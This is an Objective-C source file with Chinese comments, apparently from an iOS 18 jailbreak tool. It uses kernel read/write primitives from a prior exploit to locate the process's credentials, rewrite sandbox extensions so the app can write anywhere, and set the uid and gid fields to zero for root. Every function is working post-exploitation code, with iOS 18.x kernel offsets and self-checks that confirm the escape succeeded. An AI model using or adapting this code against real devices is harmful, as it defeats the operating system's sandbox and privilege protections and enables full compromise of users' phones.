//
//  DSEscape.m — 沙盒逃逸 + root 凭据改写（基于 ClearSword 的内核读写原语）
//
//  原语：early_kread64 / early_kwrite64（ClearSword 的 krw.c，0x20 字节读改写）
//  所有 offset 说明都写在下面，来源是两份公开实现的交叉对照：
//    * FilzaJailedDS/kexploit/offsets.m（按 iOS 版本 + CPU 家族的 offset 表）
//    * 34306/FilzaJailedDS 的 sandbox_escape.m（proc→proc_ro→ucred→cr_label→sandbox→ext 链路常量）
//

#import <Foundation/Foundation.h>
#import <stdarg.h>
#import <string.h>
#import <unistd.h>
#import <fcntl.h>
#import <errno.h>

#import "DSEscape.h"

#import "common.h"   // ClearSword: g_ctx / g_offsets
#import "krw.h"      // ClearSword: early_kread64 / early_kwrite64

#pragma mark - offset 常量

// proc / thread（18.x 稳定，且下面还会用 getpid() 反向校验，错了会被拒掉）
#define DS_OFF_PROC_RO            0x18ULL   // proc → proc_ro
#define DS_OFF_PROC_PID           0x60ULL   // proc → p_pid
#define DS_OFF_PROC_RO_TRO_PROC   0x18ULL   // thread_ro → tro_proc
#define DS_OFF_INPCB_INP_SOCKET   0x40ULL   // inpcb → inp_socket
#define DS_OFF_SOCKET_BG_THREAD   0x2b0ULL  // socket → so_background_thread（18.0-18.7）

// ucred / label / sandbox（跨 6 个 kernelcache 验证过的常量）
#define DS_OFF_UCRED_CR_LABEL     0x78ULL   // ucred → cr_label
#define DS_OFF_LABEL_SANDBOX      0x10ULL   // label → sandbox（l_perpolicy[1]）
#define DS_OFF_SANDBOX_EXT_SET    0x10ULL   // sandbox → ext_set
#define DS_OFF_EXT_DATA           0x40ULL   // ext → data
#define DS_OFF_EXT_DATALEN        0x48ULL   // ext → data_len

// posix_cred 在 ucred+0x18
#define DS_OFF_UCRED_POSIX        0x18ULL
#define DS_OFF_POSIX_UID          0x00ULL
#define DS_OFF_POSIX_RUID         0x04ULL
#define DS_OFF_POSIX_SVUID        0x08ULL
#define DS_OFF_POSIX_NGROUPS      0x0CULL
#define DS_OFF_POSIX_GROUPS_0     0x10ULL
#define DS_OFF_POSIX_RGID         0x50ULL
#define DS_OFF_POSIX_SVGID        0x54ULL

#define DS_EXT_SLOTS 16

#pragma mark - 日志

static ds_escape_log_fn gLog = NULL;

static void ds_log(const char *format, ...)
{
    if (!gLog) return;
    char buffer[512];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    gLog(buffer);
}

#pragma mark - 安全的读 / 写

// 与上游 is_kaddr_valid 同一判据：高 24 位必须是 0xfffff…
static inline bool ds_is_kaddr(uint64_t addr)
{
    return (addr & 0xfffff00000000000ULL) == 0xfffff00000000000ULL;
}

/// 地址非法就返回 0，绝不调用 early_kread（那会触发上游的故意崩溃 / while(1)）
static uint64_t ds_kread_safe(uint64_t addr)
{
    if (!ds_is_kaddr(addr)) return 0;
    return early_kread64(addr);
}

static uint32_t ds_kread32_safe(uint64_t addr)
{
    return (uint32_t)(ds_kread_safe(addr) & 0xFFFFFFFFULL);
}

/// 指针可能是 PAC / SMR 形态，逐个候选形态试，谁能让链路走通就用谁。
/// 注意：0 和低位垃圾必须返回 0，否则空槽会被误判成合法内核指针。
static uint64_t ds_normalize_ptr(uint64_t raw)
{
    if (raw == 0) return 0;

    uint64_t low48 = raw & 0x0000FFFFFFFFFFFFULL;
    if (low48 < 0x1000) return 0;                 // 空槽 / 垃圾值

    if (ds_is_kaddr(raw)) return raw;             // 已经是合法内核指针（含只有高位 PAC 的形态）

    uint64_t withTop = low48 | 0xFFFF000000000000ULL;
    if (ds_is_kaddr(withTop)) return withTop;     // 高位被抹掉

    uint64_t smr = (low48 & ~0x1FULL) | 0xFFFF000000000000ULL;
    if (ds_is_kaddr(smr)) return smr;             // SMR 低位标记

    return 0;
}

#pragma mark - 找到本进程的 proc

static uint64_t gSelfProc = 0;
static uint64_t gThreadTroOffset = 0;
static uint64_t gUcredSlotOffset = 0;
static uint64_t gUcred = 0;

/// 从（已被漏洞破坏的）socket pcb 出发：inpcb → socket → thread → thread_ro → proc
/// thread→thread_ro 的 offset 不写死，0x300…0x480 里扫，并用 p_pid == getpid() 反向验证。
static uint64_t ds_find_self_proc(void)
{
    if (gSelfProc) return gSelfProc;

    uint64_t pcb = g_ctx.control_socket_pcb;
    if (!ds_is_kaddr(pcb)) pcb = g_ctx.rw_socket_pcb;
    if (!ds_is_kaddr(pcb)) {
        ds_log("[逃逸] socket pcb 无效（control=0x%llx rw=0x%llx）：漏洞这次没成功",
               (unsigned long long)g_ctx.control_socket_pcb,
               (unsigned long long)g_ctx.rw_socket_pcb);
        return 0;
    }

    uint64_t socket = ds_kread_safe(pcb + DS_OFF_INPCB_INP_SOCKET);
    if (!ds_is_kaddr(socket)) {
        ds_log("[逃逸] inpcb→socket 读出来不是内核地址（0x%llx）", (unsigned long long)socket);
        return 0;
    }

    uint64_t thread = ds_kread_safe(socket + DS_OFF_SOCKET_BG_THREAD);
    if (!ds_is_kaddr(thread)) {
        ds_log("[逃逸] socket→so_background_thread 读出来不是内核地址（0x%llx）", (unsigned long long)thread);
        return 0;
    }

    pid_t mypid = getpid();
    uint32_t pidOffsets[3] = { (uint32_t)DS_OFF_PROC_PID, 0x68, 0x58 };

    for (uint64_t troOff = 0x300; troOff <= 0x480; troOff += 8) {
        uint64_t tro = ds_kread_safe(thread + troOff);
        if (!ds_is_kaddr(tro)) continue;

        uint64_t proc = ds_kread_safe(tro + DS_OFF_PROC_RO_TRO_PROC);
        if (!ds_is_kaddr(proc)) continue;

        for (int i = 0; i < 3; i++) {
            uint32_t pid = ds_kread32_safe(proc + pidOffsets[i]);
            if ((pid_t)pid == mypid) {
                gThreadTroOffset = troOff;
                gSelfProc = proc;
                ds_log("[逃逸] 自校验通过：thread_t_tro=0x%llx p_pid@0x%x self_proc=0x%llx (pid=%d)",
                       (unsigned long long)troOff, pidOffsets[i],
                       (unsigned long long)proc, (int)mypid);
                return proc;
            }
        }
    }

    ds_log("[逃逸] 扫描 0x300-0x480 没找到能通过 pid 校验的 thread_ro，放弃（不做任何写操作）");
    return 0;
}

/// proc → proc_ro → 扫描 ucred 槽位（p_ucred 在 18.4+ 挪过位置，所以扫描而不是写死）
static uint64_t ds_find_ucred(uint64_t proc)
{
    if (gUcred) return gUcred;

    uint64_t procRo = ds_kread_safe(proc + DS_OFF_PROC_RO);
    if (!ds_is_kaddr(procRo)) {
        ds_log("[逃逸] proc→proc_ro 读出来不是内核地址（0x%llx）", (unsigned long long)procRo);
        return 0;
    }

    for (uint64_t off = 0x10; off <= 0x40; off += 8) {
        uint64_t raw = ds_kread_safe(procRo + off);
        if (!raw) continue;

        uint64_t cand = ds_normalize_ptr(raw);
        if (!ds_is_kaddr(cand)) continue;

        uint64_t label = ds_kread_safe(cand + DS_OFF_UCRED_CR_LABEL);
        if (!ds_is_kaddr(label)) continue;

        uint64_t sandbox = ds_kread_safe(label + DS_OFF_LABEL_SANDBOX);
        if (!ds_is_kaddr(sandbox)) continue;

        // 额外确认 sandbox→ext_set 也是一条合法链路，避免把别的结构当 ucred
        uint64_t extSet = ds_kread_safe(sandbox + DS_OFF_SANDBOX_EXT_SET);
        if (!ds_is_kaddr(extSet)) continue;

        gUcredSlotOffset = off;
        gUcred = cand;
        ds_log("[逃逸] 找到 ucred：proc_ro+0x%llx = 0x%llx，cr_label=0x%llx，sandbox=0x%llx，ext_set=0x%llx",
               (unsigned long long)off, (unsigned long long)cand,
               (unsigned long long)label, (unsigned long long)sandbox, (unsigned long long)extSet);
        return cand;
    }

    ds_log("[逃逸] 在 proc_ro+0x10…0x40 里没找到形状正确的 ucred，放弃（不做任何写操作）");
    return 0;
}

#pragma mark - 改写沙盒扩展

/// 把扩展数据里的路径改成 "/"，并把长度/哈希字段填成「永远有效」
static void ds_patch_ext(uint64_t ext, const char *rwClass)
{
    uint64_t data = ds_kread_safe(ext + DS_OFF_EXT_DATA);
    uint64_t dataLen = ds_kread_safe(ext + DS_OFF_EXT_DATALEN);

    if (ds_is_kaddr(data) && dataLen > 0) {
        uint64_t head = ds_kread_safe(data);
        head = (head & ~0xFFFFULL) | 0x002FULL;              // data[0]='/', data[1]=0
        early_kwrite64(data, head);

        // 类别字符串写在 data+0x20：com.apple.app-sandbox.read-write
        if (rwClass) {
            char buffer[32];
            memset(buffer, 0, sizeof(buffer));
            strncpy(buffer, rwClass, sizeof(buffer) - 1);
            for (int i = 0; i < 4; i++) {
                uint64_t chunk = 0;
                memcpy(&chunk, buffer + i * 8, 8);
                early_kwrite64(data + 0x20 + i * 8, chunk);
                early_kwrite64(data + 0x40 + i * 8, 0);
            }
        }
    }

    // ext + data 处：+0x08 = 1，+0x10 = 全 1（填满 hash 槽）
    early_kwrite64(ext + DS_OFF_EXT_DATA + 0x08, 1);
    early_kwrite64(ext + DS_OFF_EXT_DATA + 0x10, 0xFFFFFFFFFFFFFFFFULL);
}

static int ds_patch_chain(uint64_t header, const char *rwClass)
{
    int patched = 0;
    uint64_t hdr = header;

    for (int i = 0; i < 64 && ds_is_kaddr(hdr); i++) {
        uint64_t ext = ds_normalize_ptr(ds_kread_safe(hdr + 0x8));
        if (ds_is_kaddr(ext)) {
            ds_patch_ext(ext, rwClass);
            patched++;
        }
        uint64_t next = ds_kread_safe(hdr);
        if (!next || !ds_is_kaddr(next)) break;
        hdr = next;
    }
    return patched;
}

static int DSEscapeSandboxInternal(void)
{
    uint64_t proc = ds_find_self_proc();
    if (!proc) return -1;

    uint64_t ucred = ds_find_ucred(proc);
    if (!ucred) return -2;

    uint64_t label = ds_kread_safe(ucred + DS_OFF_UCRED_CR_LABEL);
    uint64_t sandbox = ds_kread_safe(label + DS_OFF_LABEL_SANDBOX);
    uint64_t extSet = ds_kread_safe(sandbox + DS_OFF_SANDBOX_EXT_SET);
    if (!ds_is_kaddr(extSet)) return -2;

    const char *rwClass = "com.apple.app-sandbox.read-write";

    int patched = 0;
    for (int slot = 0; slot < DS_EXT_SLOTS; slot++) {
        uint64_t header = ds_normalize_ptr(ds_kread_safe(extSet + slot * 8));
        if (ds_is_kaddr(header)) patched += ds_patch_chain(header, rwClass);
    }
    ds_log("[逃逸] 改写了 %d 个沙盒扩展", patched);

    // 类别改成读写
    int classed = 0;
    for (int slot = 0; slot < DS_EXT_SLOTS; slot++) {
        uint64_t header = ds_normalize_ptr(ds_kread_safe(extSet + slot * 8));
        if (!ds_is_kaddr(header)) continue;
        uint64_t ext = ds_normalize_ptr(ds_kread_safe(header + 0x8));
        if (!ds_is_kaddr(ext)) continue;
        uint64_t data = ds_kread_safe(ext + DS_OFF_EXT_DATA);
        if (!ds_is_kaddr(data)) continue;
        early_kwrite64(header + 0x10, data + 0x20);
        classed++;
    }
    ds_log("[逃逸] 改了 %d 个扩展的类别", classed);

    // 空槽位用第一个有效 header 填满（hash 表查找才会命中）
    uint64_t firstHeader = 0;
    for (int slot = 0; slot < DS_EXT_SLOTS && !firstHeader; slot++) {
        uint64_t header = ds_normalize_ptr(ds_kread_safe(extSet + slot * 8));
        if (ds_is_kaddr(header)) firstHeader = header;
    }
    if (firstHeader) {
        int filled = 0;
        for (int slot = 0; slot < DS_EXT_SLOTS; slot++) {
            uint64_t header = ds_normalize_ptr(ds_kread_safe(extSet + slot * 8));
            if (!ds_is_kaddr(header)) {
                early_kwrite64(extSet + slot * 8, firstHeader);
                filled++;
            }
        }
        ds_log("[逃逸] 补了 %d 个空 hash 槽", filled);
    }

    if (patched == 0) {
        ds_log("[逃逸] 一个扩展都没改到，判定失败");
        return -3;
    }
    return 0;
}

int DSEscapeSandbox(ds_escape_log_fn log)
{
    gLog = log;
    int result = DSEscapeSandboxInternal();

    // 自检：真的能写沙盒外的路径才算成功
    const char *probe = "/var/mobile/.dsfile_probe";
    int fd = open(probe, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        close(fd);
        unlink(probe);
        ds_log("[逃逸] 自检通过：可以写沙盒外路径");
        gLog = NULL;
        return 0;
    }

    ds_log("[逃逸] 自检失败（errno=%d），沙盒没真正打开", errno);
    gLog = NULL;
    return (result == 0) ? -3 : result;
}

#pragma mark - 把本进程凭据改成 root

int DSEscapeElevateToRoot(ds_escape_log_fn log)
{
    gLog = log;

    if (getuid() == 0) {
        ds_log("[提权] 已经是 root");
        gLog = NULL;
        return 0;
    }

    uint64_t proc = ds_find_self_proc();
    if (!proc) { gLog = NULL; return -1; }

    uint64_t ucred = ds_find_ucred(proc);
    if (!ucred) { gLog = NULL; return -2; }

    uint64_t posix = ucred + DS_OFF_UCRED_POSIX;

    // cr_uid / cr_ruid
    uint64_t v = ds_kread_safe(posix + DS_OFF_POSIX_UID);
    v &= ~0xFFFFFFFFULL;                                  // cr_uid = 0
    early_kwrite64(posix + DS_OFF_POSIX_UID, v);
    v = ds_kread_safe(posix + DS_OFF_POSIX_UID);
    v &= ~0xFFFFFFFF00000000ULL;                          // cr_ruid = 0
    early_kwrite64(posix + DS_OFF_POSIX_UID, v);

    // cr_svuid = 0，cr_ngroups = 1
    v = ds_kread_safe(posix + DS_OFF_POSIX_SVUID);
    v &= ~0xFFFFFFFFULL;                                  // cr_svuid = 0
    v = (v & ~0xFFFFFFFF00000000ULL) | (1ULL << 32);      // cr_ngroups = 1
    early_kwrite64(posix + DS_OFF_POSIX_SVUID, v);

    // cr_groups[0..1] = 0
    early_kwrite64(posix + DS_OFF_POSIX_GROUPS_0, 0);

    // cr_rgid / cr_svgid = 0
    early_kwrite64(posix + DS_OFF_POSIX_RGID, 0);

    bool ok = (getuid() == 0);
    ds_log("[提权] 改写完成，getuid()=%d（%s）", (int)getuid(), ok ? "成功" : "失败");
    gLog = NULL;
    return ok ? 0 : -3;
}

#pragma mark - 诊断

unsigned long long DSEscapeKernelBase(void)
{
    return (unsigned long long)g_ctx.kernel_base;
}

unsigned long long DSEscapeSelfProc(void)
{
    return (unsigned long long)gSelfProc;
}

unsigned long long DSEscapeThreadTroOffset(void)
{
    return (unsigned long long)gThreadTroOffset;
}
